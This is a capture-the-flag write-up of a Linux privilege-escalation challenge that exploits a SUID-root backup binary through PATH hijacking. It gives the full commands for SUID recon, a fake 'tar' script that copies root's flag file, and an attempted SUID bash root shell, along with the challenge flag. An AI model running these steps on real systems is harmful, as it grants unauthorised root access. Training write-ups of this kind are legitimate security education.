# Heavy is the Crown

> **Category:** Forensics / Linux · **Points:** 500 · **Author:** @syyntax · **Track:** [Linux Privilege Escalation](README.md)

## Scenario

Part of a multi-stage privilege-escalation chain on a shared Linux box named `charon`. A low-privilege foothold as `svc-deploy` was already obtained, pivoted to the DEADFACE "second-in-command" account `mort1cia` (see [Old Habits](../osint/old-habits.md)), and the goal of this stage is to go from `mort1cia` all the way to **root** and read the flag from root's home directory.

## Step 1: Standard Linux privilege-escalation recon

Whenever a new Linux account is reached, the very first thing to check for is any program that runs with more privileges than the current user. The two classic things to look for:

- **SUID binaries**: programs that always run as their *owner* (often root), regardless of who launches them.
- **Linux capabilities**: a more fine-grained version of the same idea (e.g. a program allowed to change its own user ID without being fully root).

```bash
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null                  # capabilities
```

This revealed a custom SUID-root binary: `/usr/local/bin/charon-backup`.

## Step 2: Inspect the SUID binary

Since it is owned by root and has the SUID bit set, anything this program does happens with root's full permissions, even when a normal user runs it.

```bash
strings /usr/local/bin/charon-backup | grep -iE "tar|cp|rsync|/bin/|/usr/|PATH"
```

This revealed the exact command the binary runs internally:

```
tar czf /var/backups/charon-ops.tgz -C /opt ops
```

**The vulnerability:** the program calls `tar` by its bare name, not by its full path (e.g. `/usr/bin/tar`). When a program does this, it relies on the shell's `PATH` environment variable to find which `tar` binary to actually run. If `PATH` can be controlled before the SUID program runs, it can be tricked into running a different program instead of the real `tar`, and since the SUID program runs as root, the substitute program runs as root too. This class of bug is called **PATH hijacking**.

## Step 3: Build and plant a malicious "tar"

```bash
mkdir -p /tmp/evil
cat > /tmp/evil/tar << 'SCRIPT'
#!/bin/sh
cp /root/flag.txt /tmp/loot.txt 2>/dev/null
chmod 644 /tmp/loot.txt 2>/dev/null
ls -la /root/ >> /tmp/loot.txt 2>/dev/null
SCRIPT
chmod +x /tmp/evil/tar
```

Instead of first trying to spawn a root shell (which ran into trouble, see below), the final working payload goes straight for the goal: it copies the target flag into a file the low-privilege user can read afterwards.

## Step 4: Make the fake "tar" win the PATH race

```bash
export PATH=/tmp/evil:$PATH
which tar
# -> /tmp/evil/tar (confirms the fake tar will be found first)
```

## Step 5: Trigger the SUID binary

```bash
/usr/local/bin/charon-backup
```

Because of the hijacked `PATH`, when the SUID binary internally tries to run `tar`, it actually runs the planted script instead, with root's privileges, since the real binary is SUID-root. The script copies the protected flag file into a world-readable location.

## A detour: why spawning a root shell didn't work here

The first attempt was the "classic" PATH-hijack payload: copy `/bin/bash` somewhere and set the SUID bit on the copy, to get an interactive root shell:

```bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
/tmp/rootbash -p
```

This technically ran, but `id` still showed the original (low-privilege) user. The reason turned out to be that `/tmp` and `/dev/shm` on this box were mounted with the `nosuid` option (verified with `mount | grep nosuid`), a standard Linux hardening measure that makes the kernel silently ignore the SUID bit for any binary stored on those filesystems, specifically to prevent this exact trick. Copying the SUID shell to `/opt` instead (a location without `nosuid`) did let the binary launch with the SUID bit honoured, but on this particular build of bash, the shell still dropped its elevated privileges immediately on startup as a further hardening measure, even with the `-p` flag. The lesson: don't fight the shell's own privilege-dropping logic; just have the hijacked payload do the sensitive action directly, exactly what the final working payload in Step 3 does.

## Step 6: Read the loot

```bash
cat /tmp/loot.txt
```

```
deadface{p4th_h1j4ck3d_t0_thr0n3}

total 16
drwx------ 1 root root 4096 ... .
drwxr-xr-x 1 root root 4096 ... ..
-r-------- 1 root root 34   ... flag.txt
-r-------- 1 root root 205  ... kingmaker.txt
```

## Flag

```
deadface{p4th_h1j4ck3d_t0_thr0n3}
```

---
[← Back to index](../../README.md)
